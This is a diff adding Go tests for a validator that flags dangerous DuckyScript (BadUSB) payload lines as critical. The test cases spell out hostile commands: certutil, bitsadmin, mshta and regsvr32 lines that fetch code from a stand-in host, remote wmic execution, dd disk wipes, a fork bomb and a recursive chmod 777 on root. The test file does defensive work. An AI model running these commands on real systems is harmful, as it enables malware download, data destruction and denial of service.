@@ -101,6 +101,119 @@ func TestValidate_DefenseDisableIsCritical(t *testing.T) {
 	}
 }
 
+// TestValidate_LOLBASRules exercises the LOLBAS download/execute and
+// lateral-execution patterns. Each is a real, well-documented attack
+// technique a DuckyScript payload can type into the target — the
+// validator must catch them all so /validate flags the script before
+// the operator approves badusb_run.
+func TestValidate_LOLBASRules(t *testing.T) {
+	cases := []struct {
+		rule string
+		line string
+	}{
+		{"certutil_download", `STRING certutil -urlcache -split -f https://evil.example/x.exe c:\x.exe`},
+		{"bitsadmin_download", `STRING bitsadmin /transfer evil https://evil.example/x.exe c:\x.exe`},
+		{"mshta_remote", `STRING mshta https://evil.example/x.hta`},
+		{"mshta_remote", `STRING mshta vbscript:CreateObject("Wscript.Shell").Run("calc")`},
+		{"regsvr32_squiblydoo", `STRING regsvr32 /s /n /u /i:https://evil.example/x.sct scrobj.dll`},
+		{"wmic_exec", `STRING wmic /node:victim process call create "calc.exe"`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.rule, func(t *testing.T) {
+			rep := Validate("lol.txt", tc.line+"\n")
+			if rep.Severity != SeverityCritical {
+				t.Fatalf("severity=%v want critical", rep.Severity)
+			}
+			found := false
+			for _, f := range rep.Findings {
+				if f.Rule == tc.rule {
+					found = true
+				}
+			}
+			if !found {
+				t.Errorf("expected rule %q in findings, got %+v", tc.rule, rep.Findings)
+			}
+		})
+	}
+}
+
+// TestValidate_BlockDeviceWipe locks the dd-to-block-device guard. A
+// payload that types `dd if=/dev/zero of=/dev/sda` is functionally
+// equivalent to mkfs on the primary disk — same critical tier.
+func TestValidate_BlockDeviceWipe(t *testing.T) {
+	cases := []string{
+		"STRING dd if=/dev/zero of=/dev/sda bs=1M",
+		"STRING dd if=/dev/urandom of=/dev/nvme0n1",
+		"STRING dd if=/dev/random of=/dev/mmcblk0",
+	}
+	for _, src := range cases {
+		t.Run(src, func(t *testing.T) {
+			rep := Validate("wipe.txt", src+"\n")
+			if rep.Severity != SeverityCritical {
+				t.Fatalf("severity=%v want critical for %q", rep.Severity, src)
+			}
+			found := false
+			for _, f := range rep.Findings {
+				if f.Rule == "dd_block_wipe" {
+					found = true
+				}
+			}
+			if !found {
+				t.Errorf("expected dd_block_wipe rule for %q, got %+v", src, rep.Findings)
+			}
+		})
+	}
+}
+
+// TestValidate_ForkBomb covers the canonical bash fork bomb. Pure DoS,
+// not data-loss, but instantly unrecoverable on the target — critical
+// tier matches the existing "rm -rf /" precedent for unrecoverable
+// effect.
+func TestValidate_ForkBomb(t *testing.T) {
+	src := `STRING :(){ :|:& };:` + "\n"
+	rep := Validate("bomb.txt", src)
+	if rep.Severity != SeverityCritical {
+		t.Fatalf("severity=%v want critical", rep.Severity)
+	}
+	found := false
+	for _, f := range rep.Findings {
+		if f.Rule == "fork_bomb" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected fork_bomb finding, got %+v", rep.Findings)
+	}
+}
+
+// TestValidate_Chmod777Root catches the recursive world-writable chmod
+// on /. Doesn't destroy data outright but breaks every privilege
+// boundary on the system — same critical tier as defense_disable rules.
+func TestValidate_Chmod777Root(t *testing.T) {
+	cases := []string{
+		"STRING chmod 777 /",
+		"STRING chmod -R 777 /",
+		"STRING chmod 0777 /",
+	}
+	for _, src := range cases {
+		t.Run(src, func(t *testing.T) {
+			rep := Validate("perms.txt", src+"\n")
+			if rep.Severity != SeverityCritical {
+				t.Fatalf("severity=%v want critical for %q", rep.Severity, src)
+			}
+			found := false
+			for _, f := range rep.Findings {
+				if f.Rule == "chmod_777_root" {
+					found = true
+				}
+			}
+			if !found {
+				t.Errorf("expected chmod_777_root for %q, got %+v", src, rep.Findings)
+			}
+		})
+	}
+}
+
 func TestValidate_LongTypingIsInfoOnly(t *testing.T) {
 	var b strings.Builder
 	for i := 0; i < 500; i++ {
